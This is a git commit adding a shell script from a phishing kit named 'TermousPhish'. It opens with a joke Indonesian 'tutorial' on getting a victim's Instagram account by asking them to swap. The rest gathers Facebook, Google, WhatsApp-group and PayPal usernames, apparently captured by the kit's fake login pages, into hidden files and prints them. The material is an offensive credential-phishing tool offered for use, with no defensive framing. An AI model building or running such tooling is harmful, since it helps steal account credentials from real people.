80dc57281a755c4735883cff51e66b9fdf173af7
TurubTermous <97165381+TurubTermous@users.noreply.github.com>
2022-01-29 01:51:20 +0700

    Add files via upload

---
+++ hasil.sh
@@ -0,0 +1,43 @@
+# TermousPhish v.02
+# Coded by:Turub_Termous
+# Partner :Online_Fighter.50
+# Instagram:Turub_Termous_Backup
+# Telegram :https://t.me/Turub_Termous
+
+
+
+                                       TERITORIAL
+                   Pertama ini nya di giniin,kemudian itu nya di gituin.
+
+CARA HACK AKUN INSTAGRAM:
+1.Download termux
+2.ketikan pkg update && pkg upgrade
+3.ketik clear
+4.buka aplikasi instagram
+5.DM si korban dengan kalimat berikut :
+ (Hallo pengguna instagram !,tukeran akun yuk!)
+6.selesai..
+
+NOTED:Kalo si korban berkenan,maka anda akan mendapatkan akunnya secara cuma2.
+Tapi kalo si korban g mau,itu tandanya anda perlu cari korban lain.
+
+SEKIAN......
+echo Facebook acount: >> .usernames-facebook.txt 
+cat Lazada/member/facebook/hasil.php >> .usernames-facebook.txt 
+cat Whatsappgrup/hasil.php >> .usernames-facebook.txt  
+echo Google acount: >> .usernames-Google.txt 
+cat Lazada/member/Google/usernames.txt >> .usernames-Google.txt 
+echo Paypal acount: >> .usernames-paypal.txt 
+cat Lazada/member/paypal/usernames.txt >> .usernames-paypal.txt 
+echo "$(clear)"
+lolcat .logo.md
+printf "\n"
+printf "\n"
+lolcat .usernames-facebook.txt
+printf "\n"
+printf "\n"
+lolcat .usernames-Google.txt
+printf "\n"
+printf "\n"
+lolcat .usernames-paypal.txt
+
